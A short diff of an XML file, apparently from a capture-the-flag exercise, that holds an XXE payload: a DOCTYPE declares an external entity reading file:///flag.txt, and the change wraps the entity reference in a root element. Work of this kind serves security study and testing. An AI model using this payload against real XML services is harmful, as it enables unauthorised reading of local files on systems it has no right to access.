@@ -2,4 +2,4 @@
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///flag.txt" >]>
-<data>&xxe;</data>
+<root><data>&xxe;</data></root>
